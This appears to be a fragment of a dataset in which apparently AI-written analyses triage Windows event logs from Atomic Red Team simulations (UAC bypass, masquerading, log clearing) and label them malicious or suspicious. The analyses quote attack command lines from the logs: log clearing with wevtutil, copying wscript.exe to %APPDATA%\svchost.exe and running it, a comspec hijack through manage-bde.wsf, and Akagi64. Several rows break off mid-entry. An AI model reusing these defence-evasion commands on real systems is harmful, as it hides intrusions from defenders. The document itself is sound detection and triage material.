### Conclusion:

Based on the analysis, the logs present activities that are SUSPICIOUS. The clearing of log files, especially security logs, and use of PowerShell in conjunction with administrative privileges points to potential unauthorized or malicious behavior. Further investigation is necessary to determine the legitimacy of these actions, identify if ""admin_test"" has been compromised, and to ensure no unauthorized modifications have been made on the system.

### Recommended Actions:

1. **Immediate Investigation:**
   - Verify the identity and activities of the user ""admin_test.""
   - Investigate the context and authorization status of the PowerShell command executed.
   - Analyze the server for indicators of compromise or unauthorized changes.

2. **Preventive Measures:**
   - Audit and monitor all administrative actions, especially those related to log management and PowerShell usage.
   - Implement alerts for log clearance operations and usage of `wevtutil.exe`.

3. **Review System Integrity:**
   - Check for other indicators on the system that may not be included in the logs.
   - Ensure all security patches and updates are current, particularly those related to PowerShell and event log management. 

The resolution for these logs is marked as **SUSPICIOUS**, necessitating further examination and verification actions to rule out or confirm malicious activity."
Modify Internet Zone Protocol Defaults in Current User Registry - cmd,"Upon carefully analyzing the provided Windows event logs, several suspicious activities stand out:

1. **Log File Clearing**: 
   - In the System log and Security log, events indicating the clearing of log files (`EventID: 104`, `EventID: 1102`) by the user `admin_test` are present. This behavior is suspicious as clearing logs can be an attempt to hide traces of malicious activity. These actions occurred within a very short time frame and affected multiple logs (System, Windows PowerShell, and Security logs).

2. **Unusual Command Execution**:
   - Sysmon logs show the execution of `wevtutil.exe`, a command-line utility for managing event logs, used with the `cl` (clear) command on several logs, including ""System"", ""Application"", and ""Security"". This further supports the suspicion of an attempt to cover tracks by deleting logs.

3. **Registry Modifications**:
   - There are events indicating command executions with `cmd.exe` and `reg.exe` to manipulate the Windows Registry (`HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults`). Alterations to the registry, especially if unexpected or unauthorized, can indicate an attempt to alter security settings or prepare for further compromise.

4. **Time Manipulation**:
   - `EventID: 4616` in the Security log shows a time change, potentially to disrupt time-based logging or forensic analysis. Changing system time is unusual and can be used to obscure the timeline of malicious activities.

5. **Integrity Level**:
   - Many processes ran with ""High"" or ""System"" integrity levels, which indicates high privileges. While this isn't inherently suspicious, combined with the log clearing and registry modifications, it indicates potentially harmful use of administrative privileges.

Based on these observations, there's a substantive basis to suspect malicious intent. The actions observed align with typical behaviors associated with attempts to bypass detection and maintain persistence.

### Assessment
- **Resolution**: **MALICIOUS**

### Recommendations
1. **Immediate Containment**: Isolate the affected host (Server002) from the network to prevent further malicious activity or lateral movement.
2. **Forensic Investigation**: Conduct a thorough forensic analysis of the host to determine the full extent of the compromise, including any potential additional payloads or persistence mechanisms.
3. **Log Review and Backup**: Review existing backup logs, if available, to determine the actions preceding the log clearing events.
4. **Policy and Access Review**: Evaluate user accounts, particularly `admin_test`, for any unauthorized access or permissions. Implement stricter access controls and logging policies.
5. **Endpoint Security Measures**: Deploy endpoint detection and response (EDR) solutions to detect, respond to, and mitigate future suspicious activities.
6. **Patch Management**: Ensure all systems and applications are up-to-date with the latest security patches and updates."
Invoke CHM with Script Engine and Help Topic,"Upon analyzing the provided logs, several indicators suggest suspicious behavior that requires further investigation. Here's a breakdown of the findings:

1. **Log Clearing Activities:**
   - The logs indicate multiple instances of log clearing across various channels, including Security, System, and Windows PowerShell:
     - Security logs cleared: Event ID 1102 (System log)
     - Application, Microsoft-Windows-Sysmon/Operational, Windows PowerShell and System channel logs cleared: Multiple instances of `wevtutil.exe` with the 'cl' argument for clearing logs.
   - This activity is not typical for routine system administration and could indicate an attempt to cover up malicious activities or unauthorized actions.

2. **Suspicious PowerShell Activity:**
   - A PowerShell command execution is captured: `powershell.exe & {Invoke-ATHCompiledHelp -ScriptEngine JScript -InfoTechStorageHandler its -TopicExtension html -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm}`.
   - The use of Invoke-ATHCompiledHelp and similar complex command structures in PowerShell can be indicators of potentially obfuscated or malicious scripts being run, often associated with script-based attack techniques.

3. **High Integrity Level Processes:**
   - The user ""SERVER002\\admin_test"" is executing processes with high integrity level privileges, suggesting possible privileged access usage.
   - Combined with the log clearing under this user account, it raises the suspicion of improper or unauthorized actions under privileged credentials.

4. **Edge Update Processes:**
   - Multiple instances of Microsoft Edge Installer activities appear to be updating or executing, which may be routine updates. However, given the context of the other suspicious activities, further confirmation of the legitimacy of these updates is necessary.

**Assessment and Recommendations:**

Based on the above observations, this situation is marked as **SUSPICIOUS**. The indicators of potential log clearing to cover tracks and the execution of intricate PowerShell commands require a deeper investigation to rule out malicious intentions.

**Guidance on How to Proceed:**

- **Immediate Actions:**
  - Investigate the ""admin_test"" account to verify if the actions align with expected user activity and whether they were authorized.
  - Validate the source and legitimacy of the invoked PowerShell scripts and their intended purposes.
  - Review endpoint protection logs and alerts for correlating signs of compromise or threat indicators.

- **Forensic Analysis:**
  - Conduct a memory analysis on ""Server002"" for any signs of active threats or malware.
  - Examine application usage and system endpoint logs during the timeframe of these events to determine any external communications or tool deployments.

- **Reinforce Security Measures:**
  - Implement monitoring for PowerShell script execution block and enhanced auditing for sensitive operations.
  - Ensure regular and automated backups for system logs to prevent unauthorized clearances.

In summary, these findings suggest **SUSPICIOUS** activity that warrants further investigation into user actions, scripts executed, and any potential compromise pathways or coverage efforts."
UACME Bypass Method 31,"Upon reviewing the provided event logs from the Windows host, several observations indicate potential malicious behavior:

1. **Clearing of Event Logs**: 
   - Both the Security and System logs show entries indicating they have been cleared (`EventID: 1102` in the Security log and `EventID: 104` in the System log). This activity was performed by the user `admin_test`, which is often indicative of an attempt to cover tracks, a behavior characteristic of malicious actors post-compromise.

2. **Suspicious Command-Line Execution**:
   - There are multiple instances of command-line activity involving potentially suspicious programs from the `AtomicRedTeam` toolset and usage of `Akagi64.exe`, which is associated with UAC bypass techniques. This indicates that tests related to atomic red teaming exercises or unauthorized tools were possibly executed, which could be part of an attack simulation or an actual compromise attempt.
   - Example found in the log: `cmd.exe /c echo C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\ExternalPayloads\uacme\31 Akagi64.exe` suggests control over command execution by an unauthorized/unintended user.

3. **Use of `wevtutil.exe`**:
   - `wevtutil.exe` is used to clear specific logs (""Microsoft-Windows-Sysmon/Operational"", ""Security"", ""System"", and ""Application""). The sequence and timing of these events align closely with the clearing of event logs, supporting the hypothesis of an attempt to remove evidence of certain actions.

4. **High Integrity Level Processes**:
   - Several commands were executed with a high integrity level, indicating administrative privileges. Coupled with the log clearing events, this suggests potential unauthorized privilege escalation or administrative access.

5. **Abnormal Process Activity**:
   - The Sysmon logs reflect process creation and activities using the `uacme` tool, further supporting evidence of attempts to bypass User Account Control or test its effectiveness.

Despite some of this activity potentially being benign in the context of security testing or system administration tasks, taken together, these behaviors strongly suggest malicious intent, such as attempts to cover tracks or perform unauthorized actions using elevated privileges.

**Resolution: MALICIOUS**
- **Threat/Risks Identified**: The actions of clearing logs, executing suspicious command lines, and using tools associated with bypassing security controls indicate unauthorized actions. The risk primarily lies in potential unauthorized access, data exposure, or further exploitation of the system.
- **Guidance on How to Proceed**:
  1. Investigate the source and intent of the `admin_test` account activities and verify if they align with known and authorized activities.
  2. Review and harden privilege management policies, ensuring that sensitive accounts have necessary auditing enabled.
  3. Check for unauthorized tools or scripts installed on the system and remove them.
  4. Conduct a thorough security assessment and forensic analysis of Server002 to ascertain the extent of the potential compromise.
  5. Monitor for IOCs (Indicators of Compromise) such as hash values and command patterns observed in these logs in other parts of the network."
Modify UseTPMKey Registry entry,"Based on the analysis of the provided logs, here are the key findings and assessments:

### Suspicious and Anomalous Activity:

1. **Event Log Clearing**:
   - Several instances of `wevtutil.exe` being used to clear various Windows Event Logs (`Security`, `System`, and `Windows PowerShell`). The clearing of event logs is a significant red flag as it is commonly used by attackers to cover their tracks and hide malicious activity.

2. **Registry Modification**:
   - The execution of `cmd.exe` with parameters to modify registry settings related to Bitlocker (`HKLM\SOFTWARE\Policies\Microsoft\FVE\ UseTPMKey`). This action is suspicious, especially if not part of a standard IT policy or operation, as it might indicate attempts to alter security settings or prepare the system for leveraged access.

3. **Commands Executed Under High Integrity**:

Masquerading - wscript.exe running as svchost.exe,"After carefully examining the provided Windows event logs, here is my analysis and findings:

### Key Observations:

1. **Event Log Clearing Operations:**
   - There are several entries indicating the clearing of event logs (`wevtutil.exe cl`) for different channels: Security, System, Application, Windows PowerShell. The user executing these commands is `SERVER002\admin_test`, and the commands are executed at a high integrity level, indicating administrative privileges.
   - Clearing event logs without a clear and legitimate reason is considered suspicious activity as it may be an attempt to cover up malicious activities.

2. **Suspicious Command Execution:**
   - The execution of a command that appears to copy and execute `wscript.exe` as `svchost.exe` from the `%APPDATA%` directory using cmd execution is highly suspicious. The command `""cmd.exe"" /c copy %SystemRoot%\System32\wscript.exe %APPDATA%\svchost.exe /Y & cmd.exe /c %APPDATA%\svchost.exe ...` strongly suggests a tactic to masquerade a script or malware as a legitimate process. Such activity is commonly associated with attack techniques like masquerading or living-off-the-land (LotL).

3. **Unauthorized Credential Access Attempts:**
   - Repeated EventID 5379 occurrences for credential reading failed attempts with return code 3221226021 indicate potential unauthorized access attempts. These failures suggest repeated attempts to read credential information with invalid attempts.

4. **High Integrity and Execution Context:**
   - The processes involved in suspicious activities execute within a high integrity context, reinforcing the severity as it implies actions conducted with enhanced privileges.

5. **System and Application Updates:**
   - There are updates related to Microsoft Defender Antivirus and Microsoft Edge. These entries appear standard and expected for system maintenance.

### Assessment:

Based on these findings, the activity captured in the logs is consistent with techniques used by adversaries to execute scripts with administrative privileges, cover tracks by clearing logs, and potentially misuse those privileges to execute or disguise malicious scripts. The evidence indicates indicators of compromise and potentially malicious intent.

### Final Resolution:

- **Resolution: MALICIOUS**

### Recommendations:

1. **Immediate Response Actions:**
   - Isolate the affected host from the network to prevent potential lateral movement.
   - Initiate a detailed forensic investigation on `SERVER002` to review file changes, unauthorized user accounts, and any signs of data exfiltration.
   - Reset credentials, especially those with elevated privileges (e.g., `admin_test`).

2. **Long-Term Security Measures:**
   - Implement tighter access controls and monitoring for administrative activities.
   - Regularly review and audit event logs, ensuring that log clearing events trigger alerts.
   - Enhance endpoint and network detection capabilities to identify similar behaviors promptly.

manage-bde.wsf Signed Script Command Execution,"Based on a thorough analysis of the provided Windows event logs, the following observations and interpretations can be made:

### Key Observations:
1. **Log Clearing Events:**
   - Various event logs (System, Windows PowerShell, and Security logs) were cleared by the user ""admin_test"" on ""SERVER002"". These actions are recorded in both the System and Security logs.
   - Cleared logs are often considered suspicious as they can be an attempt to hide malicious activity.

2. **Use of `wevtutil` Command:**
   - The `wevtutil.exe` command-line utility was executed multiple times to clear different logs (Application, System, Windows PowerShell, Security). The use of `wevtutil` to clear logs is commonly associated with malicious activities where the attacker attempts to cover their tracks.

3. **Suspicious Command Execution:**
   - There is an entry for `cmd.exe` with a command line that includes `set comspec=%%windir%%\System32\calc.exe & cscript %%windir%%\System32\manage-bde.wsf`. This command is highly suspicious as it indicates a potential environment variable hijack or an attempt to chain commands in an unusual manner that can be leveraged for privilege escalation or arbitrary code execution.

4. **Time Setting Changes:**
   - Multiple alterations to system time were recorded (`EventID: 4616`). Though technically possible for benign administrative purposes, changes to system time could also be used to manipulate timestamps of other logs or records, aiding in covering tracks.

### Assessment:
- **Benign or Legitimate Activities:**
  - Without additional context, some `svchost.exe` and `conhost.exe` processes appearing in logs might typically be benign, as these processes are legitimate parts of the Windows operating system. However, they should be checked in the context of how they were executed.

- **Indicators of Suspicion or Compromise:**
  - The clearing of logs, especially when paired with suspicious `wevtutil` and `cmd` shell commands, points strongly toward an attempt to clean evidence of potentially malicious activity.
  - The environment variable hijack attempt to run `calc.exe` as a shell is a known technique to execute arbitrary binaries under different contexts, which aligns with some adversarial behaviors.

### Conclusion:
Given these findings, it is reasonable to categorize this activity as **MALICIOUS**. The combination of log file clearing, leveraging command-line utility with evasive tactics, and suspicious command executions are strong indicators of compromised intent or actual compromise.

### Recommendations:
1. **Immediate Actions:**
   - Isolate the server `SERVER002` for a thorough forensic investigation.
   - Review user ""admin_test"" credentials for unauthorized use or compromise.

2. **Further Analysis:**

Bypass UAC by Mocking Trusted Directories,"After reviewing the provided event logs, let me present the analysis:

### Security Logs:
- **Event ID 1102:** Indicates that the security event log was cleared by user `admin_test`. Log clearing can be indicative of an attempt to cover tracks.
- **Event ID 4634 and 4624:** Show logon and logoff events for the user `admin_test`. 
- **Event ID 4672:** Shows `admin_test` was granted several high-level privileges, including `SeDebugPrivilege` and `SeSecurityPrivilege`. The presence of such privileges is often normal for an administrator account but deserves scrutiny in conjunction with other suspicious activity.
- **Event ID 4616:** Indicates a time change event. The system time was modified, which is a common technique used by attackers to obscure log timing.

### Sysmon Logs:
- **Use of `wevtutil.exe`:** Multiple events indicate the use of `wevtutil.exe` to clear Windows event logs. Specifically, logs relating to security and system have been cleared.
- **Suspicious `cmd.exe` Activity:** The log shows a command execution through `cmd.exe` attempting to manipulate files and create symbolic links in system directories. This indicates an attempt to bypass security measures or escalate privileges.

### Application, Windows PowerShell, and System Logs:
- **Event ID 104:** The system log channel and Windows PowerShell log channel were cleared by `admin_test`, similar to the security logs. This again indicates potential track-covering efforts.
- **Time Change Events (Kernel-General):** Confirms that multiple system time changes occurred.

### Assessment:
The logs show a combination of signs that typically indicate malicious activity:
1. Security, system, and PowerShell logs are being cleared.
2. The suspicious use of `cmd.exe` to create symbolic links and copies in sensitive directories.
3. Unusual system time modifications.
4. Extensive admin privileges consistent with typical pen-testing exploits.
5. The `wevtutil.exe` activity suggests an intent to hide certain actions by clearing logs, which is a red flag for malicious activity.

Taking into account these findings, the overall situation indicates potential malicious activity or compromise, most likely involving attempts to escalate privileges and cover tracks by modifying or clearing event logs.

### Resolution:
- **MALICIOUS**: The combination of log clearing, suspicious command executions, excessive privilege activities, and system time modification are indicative of malicious activity.
